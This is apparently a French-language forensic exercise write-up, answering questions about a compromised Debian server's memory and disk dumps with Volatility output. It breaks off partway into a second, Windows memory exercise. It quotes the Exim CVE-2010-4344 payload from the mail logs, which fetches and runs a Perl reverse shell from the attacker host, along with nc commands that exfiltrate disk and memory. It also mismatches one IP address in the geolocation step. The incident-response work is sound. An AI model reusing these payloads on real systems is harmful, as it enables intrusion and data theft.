0x0e978e60 hostname 2165 - 0 0 0xf000e987 - 0x0e979280 dhclient-script 2163 - 0 0 0xf000e987 - 0x0e9796a0 portmap 1429 - 1 1 ---------- - 0x0e979ac0 sshd 1687 - 0 0 ---------- - 0x0f42e040 khelper 7 - 0 0 0xf000e987 - 0x0f42e460 events/0 6 - 0 0 0xf000e987 - 0x0f42eca0 ksoftirqd/0 4 - 0 0 0xf000e987 - 0x0f42f4e0 kthreadd 2 - 0 0 0xf000e987 - 0x0f42f900 init 1 - 0 0 ---------- - 0x0f43e080 scsi_eh_0 634 - 0 0 0xf000e987 - 0x0f43e4a0 sshd 2157 - 0 0 0xf000e987 - 0x0f43e8c0 nc 2169 - 0 0 ---------- - 0x0f43ece0 acpid 1672 - 0 0 ---------- - 0x0f43f100 pdflush 123 - 0 0 0xf000e987 - 0x0f43f520 aio/0 126 - 0 0 0xf000e987 - 0x0f43f940 modprobe 1061 - 0 0 0xf000e987 - 0x0f45c0c0 kjournald 700 - 0 0 0xf000e987 - 0x0f45c4e0 ksuspend_usbd 581 - 0 0 0xf000e987 - 0x0f45c900 dhclient3 1624 - 0 0 ---------- - 0x0f45cd20 exim4 1942 - 101 103 ---------- - 0x0f45d140 kacpi_notify 42 - 0 0 0xf000e987 - 0x0f45d560 kswapd0 125 - 0 0 0xf000e987 - 0x0f45d980 pdflush 124 - 0 0 0xf000e987 - 0x0f46c100 nc 2161 - 0 0 0xf000e987 - 0x0f46c520 rsyslogd 1664 - 0 0 ---------- - 0x0f46c940 kseriod 86 - 0 0 0xf000e987 - 0x0f46cd60 getty 1998 - 0 0 ---------- - 0x0f46d180 dd 2160 - 0 0 0xf000e987 - 0x0f46d5a0 udevd 776 - 0 0 ---------- - 0x0f46d9c0 ata/0 594 - 0 0 0xf000e987 - 0x0f48c140 chown 2061 - 0 103 0xf000e987 - 0x0f48c560 getty 1992 - 0 0 ---------- - 0x0f48c980 run-parts 2096 - 0 0 0xf000e987 - 0x0f48cda0 sh 2095 - 0 0 0xf000e987 - 0x0f48d1c0 khubd 582 - 0 0 0xf000e987 - 0x0f48d5e0 cron 2094 - 0 0 0xf000e987 - 0x0f48da00 exim4 2084 - 101 103 0xf000e987 - 0x0f4a0180 getty 2000 - 0 0 ---------- - 0x0f4a05a0 udevd 1055 - 0 0 0xf000e987 - 0x0f4a09c0 rsyslogd 2030 - 0 0 0xf000e987 - 0x0f4a0de0 rsyslogd 2155 - 0 0 0xf000e987 - 0x0f4a1200 kacpid 41 - 0 0 0xf000e987 - 0x0f4a1620 getty 1996 - 0 0 ---------- - 0x0f4a1a40 kblockd/0 39 - 0 0 0xf000e987 - 0x0f8021c0 bash 2042 - 0 0 ---------- - 0x0f8025e0 rsyslogd 2068 - 0 0 0xf000e987 - 0x0f802a00 ata_aux 595 - 0 0 0xf000e987 - 0x0f802e20 sshd 2100 - 103 65534 0xf000e987 - 0x0f803240 getty 1994 - 0 0 ---------- - 0x0f803660 rsyslogd 2087 - 0 0 0xf000e987 - 0x0f803a80 cron 1973 - 0 0 ---------- - 0x0f42e880 watchdog/0 5 - 0 0 0xf000e987 - 0x0f42f0c0 migration/0 3 - 0 0 0xf000e987 - 0x0faac280 memdump 2168 - 0 0 ---------- - 0x0faac6a0 rsyslogd 2159 - 0 0 0xf000e987 - 0x0faacac0 sshd 2153 - 0 0 0xf000e987 - 0x0faacee0 sh 2065 - 0 0 ---------- - 0x0faad300 sh 2150 - 101 103 0xf000e987 - 0x0faad720 login 1990 - 0 0 ---------- - 0x0faadb40 sshd 2154 - 103 65534 0xf000e987 -","title":"B4- Quels sont les processus qui tournaient sur cette machine au moment du dump?"},{"location":"forensic/exercices/dump_mem_disk/#b5-quelle-est-ladresse-ip-du-pc","text":"volatility --profile=LinuxDebian5010x86 -f memdump.img linux_route_cache Volatility Foundation Volatility Framework 2.6 Interface Destination Gateway ---------------- -------------------- ------- lo 192.168.56.102 192.168.56.102 eth0 192.168.56.1 192.168.56.1 eth0 192.168.56.1 192.168.56.1 L'IP de la machine est : 192.168.56.102","title":"B5- Quelle est l'adresse IP du PC?"},{"location":"forensic/exercices/dump_mem_disk/#b6-quels-sont-les-ports-en-ecoute-dans-quel-etat-sont-ils","text":"volatility --profile=LinuxDebian5010x86 -f memdump.img linux_netstat Volatility Foundation Volatility Framework 2.6 UNIX 2190 udevd/776 UDP 0.0.0.0 : 111 0.0.0.0 : 0 portmap/1429 TCP 0.0.0.0 : 111 0.0.0.0 : 0 LISTEN portmap/1429 UDP 0.0.0.0 : 769 0.0.0.0 : 0 rpc.statd/1441 UDP 0.0.0.0 :38921 0.0.0.0 : 0 rpc.statd/1441 TCP 0.0.0.0 :39296 0.0.0.0 : 0 LISTEN rpc.statd/1441 UDP 0.0.0.0 : 68 0.0.0.0 : 0 dhclient3/1624 UNIX 5069 dhclient3/1624 UNIX 4617 rsyslogd/1661 /dev/log UNIX 4636 acpid/1672 /var/run/acpid.socket UNIX 4638 acpid/1672 TCP :: : 22 :: : 0 LISTEN sshd/1687 TCP 0.0.0.0 : 22 0.0.0.0 : 0 LISTEN sshd/1687 TCP :: : 25 :: : 0 LISTEN exim4/1942 TCP 0.0.0.0 : 25 0.0.0.0 : 0 LISTEN exim4/1942 UNIX 5132 login/1990 TCP 192.168.56.102 :43327 192.168.56.1 : 4444 ESTABLISHED sh/2065 TCP 192.168.56.102 :43327 192.168.56.1 : 4444 ESTABLISHED sh/2065 TCP 192.168.56.102 :43327 192.168.56.1 : 4444 ESTABLISHED sh/2065 TCP 192.168.56.102 : 25 192.168.56.101 :37202 CLOSE sh/2065 TCP 192.168.56.102 : 25 192.168.56.101 :37202 CLOSE sh/2065 TCP 192.168.56.102 :56955 192.168.56.1 : 8888 ESTABLISHED nc/2169","title":"B6- Quels sont les ports en \u00e9coute, dans quel \u00e9tat sont ils?"},{"location":"forensic/exercices/dump_mem_disk/#b7-quelle-est-ladresse-ip-de-lattaquant","text":"Le service exim4 \u00e9coute sur le port 25, on voit 2 connexion \u00e0 l'\u00e9tat CLOSE . On voit aussi 4 connexions \"ESTABLISHED\" vers 192.168.56.1 sur les ports 4444 et 8888 (\u00e9tabli avec netcat). Il y a de forte chance pour que 192.168.56.1 soit la machine attaquante. Mais je suspecte 192.168.56.101 d'avoir initier la premi\u00e8re connexion.","title":"B7- Quelle est l'adresse IP de l'attaquant?"},{"location":"forensic/exercices/dump_mem_disk/#b8-quels-services-aont-ete-exploites-par-lattaquant-en-vue-de-prendre-le-controle-du-serveur-a-quoi-sertservent-ces-services","text":"TCP 192.168.56.102 : 25 192.168.56.101 :37202 CLOSE sh/2065 TCP 192.168.56.102 : 25 192.168.56.101 :37202 CLOSE sh/2065 Une connexion sur un shell a \u00e9t\u00e9 faite, allons voir ce qu'il s'est pass\u00e9. volatility --profile=LinuxDebian5010x86 -f memdump.img linux_bash Pid Name Command Time Command -------- -------------------- ------------------------------ ------- 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-base 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-daemon-light 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -l | grep exim 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-config 2042 bash 2011-02-06 14:04:39 UTC+0000 ls -a 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg --purge 2042 bash 2011-02-06 14:04:39 UTC+0000 pwd 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -l | grep exim 2042 bash 2011-02-06 14:04:39 UTC+0000 mkdir exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-config_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 cd exim4/ 2042 bash 2011-02-06 14:04:39 UTC+0000 scp yom@192.168.56.1:/home/yom/temporary/exmi4/* . 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-base_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-base_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i --ignore-depends=exim4-base,exim4-daemon-light exim4_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 /etc/init.d/networking restart 2042 bash 2011-02-06 14:04:39 UTC+0000 ifconfig 2042 bash 2011-02-06 14:04:39 UTC+0000 /etc/init.d/networking start 2042 bash 2011-02-06 14:04:39 UTC+0000 halt 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install openssh-server 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install openssh-server 2042 bash 2011-02-06 14:04:39 UTC+0000 cd /etc/exim4/ 2042 bash 2011-02-06 14:04:39 UTC+0000 scp yom@192.168.56.1:/home/yom/temporary/exim4/* . 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-daemon-light_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 cd .. 2042 bash 2011-02-06 14:04:39 UTC+0000 ls 2042 bash 2011-02-06 14:04:39 UTC+0000 rm -rf exim4/ 2042 bash 2011-02-06 14:04:39 UTC+0000 vi .bash 2042 bash 2011-02-06 14:04:39 UTC+0000 vi .ssh/known_hosts 2042 bash 2011-02-06 14:04:39 UTC+0000 vi .bash_history 2042 bash 2011-02-06 14:04:39 UTC+0000 vi update-exim4.conf.conf 2042 bash 2011-02-06 14:04:39 UTC+0000 update-exim4.conf 2042 bash 2011-02-06 14:04:39 UTC+0000 halt 2042 bash 2011-02-06 14:04:39 UTC+0000 reboot 2042 bash 2011-02-06 14:04:39 UTC+0000 whereis gcc 2042 bash 2011-02-06 14:04:39 UTC+0000 whereis memdump 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install memdump 2042 bash 2011-02-06 14:04:39 UTC+0000 halt 2042 bash 2011-02-06 14:04:39 UTC+0000 ifconfig 2042 bash 2011-02-06 14:04:39 UTC+0000 ping 192.168.56.1 2042 bash 2011-02-06 14:04:39 UTC+0000 mount 2042 bash 2011-02-06 14:04:39 UTC+0000 sudo dd if=/dev/sda | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 dd if=/dev/sda | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 dd if=/dev/sda1 | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install memdump 2042 bash 2011-02-06 14:04:39 UTC+0000 netstat -ant 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install ddrescue 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install dcfldd 2042 bash 2011-02-06 14:04:39 UTC+0000 ls /dev/kmem 2042 bash 2011-02-06 14:04:39 UTC+0000 ls /dev/mem 2042 bash 2011-02-06 14:04:39 UTC+0000 halt 2042 bash 2011-02-06 14:04:39 UTC+0000 ifconfig 2042 bash 2011-02-06 14:04:39 UTC+0000 ifconfig 2042 bash 2011-02-06 14:04:39 UTC+0000 reboot 2042 bash 2011-02-06 14:04:46 UTC+0000 ifconfig 2042 bash 2011-02-06 14:24:43 UTC+0000 dd if=/dev/sda1 | nc 192.168.56.1 8888 2042 bash 2011-02-06 14:42:29 UTC+0000 memdump | nc 192.168.56.1 8888 On peut voir que beaucoup de choses ont \u00e9t\u00e9 faites : changer la version d'exim 4 par : exim4-base_4.69-9_i386.deb installation d'openssh : apt-get install openssh-server => pas de sudo devant apt-get, on peut supposer que l'utilisateur \u00e9tait en root . scp yom@192.168.56.1:/home/yom/temporary/exim4/* . => yom est l'utilisateur depuis le PC attaquant install\u00e9 un outil pour dump la m\u00e9moire dumper /dev/sda et /dev/sda1 via netcat \u00e0 l'adresse : 192.168.56.1 initier des connexions scp et netcat sur les ports 4444 et 8888. Si on regarde du c\u00f4t\u00e9 des process volatility --profile=LinuxDebian5010x86 -f memdump.img linux_pslist_cache Offset Name Pid PPid Uid Gid DTB Start Time ---------- -------------------- --------------- --------------- --------------- ------ ---------- ---------- 0xcf45c0c0 kjournald 700 2 0 0 ---------- 2011-02-06 12:04:18 UTC+0000 0xcf45c4e0 ksuspend_usbd 581 2 0 0 ---------- 2011-02-06 12:04:14 UTC+0000 0xcf45c900 dhclient3 1624 1 0 0 0x0ec3d000 2011-02-06 12:04:39 UTC+0000 0xcf45cd20 exim4 1942 1 101 103 0x0e7bc000 2011-02-06 12:04:44 UTC+0000 0xcf45d140 kacpi_notify 42 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf45d560 kswapd0 125 2 0 0 ---------- 2011-02-06 12:04:10 UTC+0000 0xcf45d980 pdflush 124 2 0 0 ---------- 2011-02-06 12:04:10 UTC+0000 0xcf42e040 khelper 7 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42e460 events/0 6 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42e880 watchdog/0 5 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42eca0 ksoftirqd/0 4 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42f0c0 migration/0 3 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42f4e0 kthreadd 2 0 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf42f900 init 1 0 0 0 0x0f4b8000 2011-02-06 12:04:09 UTC+0000 0xcfaac280 memdump 2168 2042 0 0 0x08088000 2011-02-06 14:42:27 UTC+0000 0xcfaacee0 sh 2065 1 0 0 0x0f517000 2011-02-06 14:07:15 UTC+0000 0xcfaad720 login 1990 1 0 0 0x0eecf000 2011-02-06 12:04:45 UTC+0000 0xcf4a0180 getty 2000 1 0 0 0x0e89e000 2011-02-06 12:04:45 UTC+0000 0xcf4a1200 kacpid 41 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf4a1620 getty 1996 1 0 0 0x0f838000 2011-02-06 12:04:45 UTC+0000 0xcf4a1a40 kblockd/0 39 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xce972660 rsyslogd 1661 1 0 0 0x0e7ed000 2011-02-06 12:04:40 UTC+0000 0xce972ea0 rsyslogd 1663 1 0 0 0x0e7ed000 2011-02-06 12:04:40 UTC+0000 0xce973b00 rpc.statd 1441 1 102 0 0x0f8b3000 2011-02-06 12:04:35 UTC+0000 0xce978620 kpsmoused 1110 2 0 0 ---------- 2011-02-06 12:04:27 UTC+0000 0xce9796a0 portmap 1429 1 1 1 0x0eddf000 2011-02-06 12:04:35 UTC+0000 0xce979ac0 sshd 1687 1 0 0 0x0fa65000 2011-02-06 12:04:41 UTC+0000 0xcf46c520 rsyslogd 1664 1 0 0 0x0e7ed000 2011-02-06 12:04:40 UTC+0000 0xcf46c940 kseriod 86 2 0 0 ---------- 2011-02-06 12:04:09 UTC+0000 0xcf46cd60 getty 1998 1 0 0 0x0f83d000 2011-02-06 12:04:45 UTC+0000 0xcf46d5a0 udevd 776 1 0 0 0x0f5b2000 2011-02-06 12:04:21 UTC+0000 0xcf46d9c0 ata/0 594 2 0 0 ---------- 2011-02-06 12:04:15 UTC+0000 0xcf8021c0 bash 2042 1990 0 0 0x0eecc000 2011-02-06 14:04:38 UTC+0000 0xcf802a00 ata_aux 595 2 0 0 ---------- 2011-02-06 12:04:15 UTC+0000 0xcf803240 getty 1994 1 0 0 0x0f671000 2011-02-06 12:04:45 UTC+0000 0xcf803a80 cron 1973 1 0 0 0x0f815000 2011-02-06 12:04:45 UTC+0000 0xcf48c560 getty 1992 1 0 0 0x0ea31000 2011-02-06 12:04:45 UTC+0000 0xcf48d1c0 khubd 582 2 0 0 ---------- 2011-02-06 12:04:14 UTC+0000 0xcf43e080 scsi_eh_0 634 2 0 0 ---------- 2011-02-06 12:04:17 UTC+0000 0xcf43e8c0 nc 2169 2042 0 0 0x08084000 2011-02-06 14:42:27 UTC+0000 0xcf43ece0 acpid 1672 1 0 0 0x0f8a8000 2011-02-06 12:04:40 UTC+0000 0xcf43f100 pdflush 123 2 0 0 ---------- 2011-02-06 12:04:10 UTC+0000 0xcf43f520 aio/0 126 2 0 0 ---------- 2011-02-06 12:04:10 UTC+0000 On retrouve les process : exim4 => service mail memdump => permet de dumper la m\u00e9moire nc => \u00e9tablire des connexions sshd => service open-ssh","title":"B8- Quel(s) service(s) a(ont) \u00e9t\u00e9 exploit\u00e9(s) par l'attaquant en vue de prendre le contr\u00f4le du serveur? A quoi sert/servent ce(s) service(s)?"},{"location":"forensic/exercices/dump_mem_disk/#b9-en-vous-basant-sur-les-deux-dumps-donner-la-cve-la-plus-probable-exploitee-par-lattaquant","text":"Le service exim4-base_4.69-9_i386.deb \u00e0 \u00e9t\u00e9 install\u00e9, il \u00e9coute sur le port 25. Allons voir si des CVEs existent : https://www.cvedetails.com/cve/CVE-2010-4344/ Heap-based buffer overflow in the string_vformat function in string.c in Exim before 4.70 allows remote attackers to execute arbitrary code via an SMTP session that includes two MAIL commands in conjunction with a large message containing crafted headers, leading to improper rejection logging. Allons voir les logs des mails pour confirmer notre hypoth\u00e8se : sudo mount -o ro,loop norecovery diskdump.img /mnt/forensic sudo su cd /mnt/forensic/var/log/exim4/ #cat rejectlog | less Header0052: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV Header0053: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV Header0054: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV Header0055: VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV HeaderX: ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 1 92.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} ${run{/bin/sh -c \"exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'\"}} On observe un maxi payload et l'ouverture d'un shell, bingo ! C'est notre CVE-2010-4344 !","title":"B9 - En vous basant sur les deux dumps, donner la CVE la plus probable exploit\u00e9e par l'attaquant"},{"location":"forensic/exercices/dump_mem_disk/#b10-est-ce-que-lattaquent-a-reussi-a-voler-des-donnees","text":"Oui l'attaquant a r\u00e9ussis \u00e0 dumper /dev/sda1 et la m\u00e9moire 2042 bash 2011-02-06 14:24:43 UTC+0000 dd if=/dev/sda1 | nc 192.168.56.1 8888 2042 bash 2011-02-06 14:42:29 UTC+0000 memdump | nc 192.168.56.1 8888 On voit que 20 minutes se sont \u00e9coul\u00e9s encotre les deux commandes, le temps de la copie de /dev/sda vers 192.168.56.1 .","title":"B10- Est-ce que l'attaquent a r\u00e9ussi a voler des donn\u00e9es?"},{"location":"forensic/exercices/dump_mem_disk/#b11-certaines-actions-entreprises-par-lattaquent-nont-pas-abouties-lesquelles","text":"Beaucoup d'actions n'ont pas abouties, on observe de multiples tentatives : Il tente de supprimer exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-base 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-daemon-light 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -l | grep exim 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim4-config 2042 bash 2011-02-06 14:04:39 UTC+0000 ls -a 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg --purge 2042 bash 2011-02-06 14:04:39 UTC+0000 pwd 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get remove exim 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -l | grep exim 2042 bash 2011-02-06 14:04:39 UTC+0000 mkdir exim4 plusieurs tentatives pour installer la version 4.69-9 de exim4 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-config_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 cd exim4/ 2042 bash 2011-02-06 14:04:39 UTC+0000 scp yom@192.168.56.1:/home/yom/temporary/exmi4/* . 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-base_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4-base_4.69-9_i386.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i --ignore-depends=exim4-base,exim4-daemon-light exim4_4.69-9_all.deb 2042 bash 2011-02-06 14:04:39 UTC+0000 dpkg -i exim4_4.69-9_all.deb Lance \u00e0 deux reprises l'installation d'open-ssh 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install openssh-server 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install openssh-server Plusieurs tentative de dumper avec dd . 2042 bash 2011-02-06 14:04:39 UTC+0000 mount 2042 bash 2011-02-06 14:04:39 UTC+0000 sudo dd if=/dev/sda | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 dd if=/dev/sda | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 dd if=/dev/sda1 | nc 192.168.56.1 4444 2042 bash 2011-02-06 14:04:39 UTC+0000 apt-get install memdump","title":"B11- Certaines actions entreprises par l'attaquent n'ont pas abouties, lesquelles?"},{"location":"forensic/exercices/dump_mem_disk/#b12-question-bonus-que-preconiseriez-vous-au-proprietaire-de-ce-serveur-pour-renforcer-la-securite-face-a-ce-type-dattaque","text":"Mettre \u00e0 jour les services, surveiller les CVEs Mise en place de s\u00e9curit\u00e9 comme un IDS/IPS Pratiquer des tests d'intrusions Mettre en place une supervision des postes avec des r\u00e8gles.","title":"B12- Question bonus: que pr\u00e9coniseriez vous au propri\u00e9taire de ce serveur pour renforcer la s\u00e9curit\u00e9 face a ce type d'attaque?"},{"location":"forensic/exercices/volatility/exercice2/","text":"Forensic exercice 2 - Volatility By Julien Faou Invetigation imageinfo kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/home/kali/Documents/forensic/exercice/exo2.vmem) PAE type : PAE DTB : 0x2fe000L KDBG : 0x80545ae0L Number of Processors : 1 Image Type (Service Pack) : 3 KPCR for CPU 0 : 0xffdff000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2012-07-22 02:45:08 UTC+0000 Image local date and time : 2012-07-21 22:45:08 -0400 connexions sockets connscan kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 connscan Volatility Foundation Volatility Framework 2.6 Offset(P) Local Address Remote Address Pid ---------- ------------------------- ------------------------- --- 0x02087620 172.16.112.128:1038 41.168.5.140:8080 1484 0x023a8008 172.16.112.128:1037 125.19.103.198:8080 1484 2 connexions d\u00e9tect\u00e9es, on note les adresses IP de destination et les PID. Localisation Via le site hostip.com 45.84.52.160 Afrique du sud Gauteng Johannesburg 125.19.103.198 France Paris pslist kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x823c89c8 System 4 0 53 240 ------ 0 0x822f1020 smss.exe 368 4 3 19 ------ 0 2012-07-22 02:42:31 UTC+0000 0x822a0598 csrss.exe 584 368 9 326 0 0 2012-07-22 02:42:32 UTC+0000 0x82298700 winlogon.exe 608 368 23 519 0 0 2012-07-22 02:42:32 UTC+0000 0x81e2ab28 services.exe 652 608 16 243 0 0 2012-07-22 02:42:32 UTC+0000 0x81e2a3b8 lsass.exe 664 608 24 330 0 0 2012-07-22 02:42:32 UTC+0000 0x82311360 svchost.exe 824 652 20 194 0 0 2012-07-22 02:42:33 UTC+0000 0x81e29ab8 svchost.exe 908 652 9 226 0 0 2012-07-22 02:42:33 UTC+0000 0x823001d0 svchost.exe 1004 652 64 1118 0 0 2012-07-22 02:42:33 UTC+0000 0x821dfda0 svchost.exe 1056 652 5 60 0 0 2012-07-22 02:42:33 UTC+0000 0x82295650 svchost.exe 1220 652 15 197 0 0 2012-07-22 02:42:35 UTC+0000 0x821dea70 explorer.exe 1484 1464 17 415 0 0 2012-07-22 02:42:36 UTC+0000 0x81eb17b8 spoolsv.exe 1512 652 14 113 0 0 2012-07-22 02:42:36 UTC+0000 0x81e7bda0 reader_sl.exe 1640 1484 5 39 0 0 2012-07-22 02:42:36 UTC+0000 0x820e8da0 alg.exe 788 652 7 104 0 0 2012-07-22 02:43:01 UTC+0000 0x821fcda0 wuauclt.exe 1136 1004 8 173 0 0 2012-07-22 02:43:46 UTC+0000 0x8205bda0 wuauclt.exe 1588 1004 5 132 0 0 2012-07-22 02:44:01 UTC+0000 Correlation Observons le process de PID=1484, pour rappel ce dernier \u00e9tablit deux connexions vers l'afrique et la france. 0x821dea70 explorer.exe 1484 1464 17 415 0 0 2012-07-22 02:42:36 UTC+0000 explorer.exe est l'explorateur de fichier de windows, il 'nest pas cens\u00e9 utiliser internet, c'est suspect. Analyse de malware malfind kali@kali:~/Documents/forensic/volatility_2.6_lin64_standalone$ ./volatility_2.6_lin64_standalone -f ../exercice/exo2.vmem --profile=WinXPSP2x86 malfind -p 1484 Volatility Foundation Volatility Framework 2.6 Process: explorer.exe Pid: 1484 Address: 0x1460000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 33, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x01460000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x01460010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x01460020 00 00 00 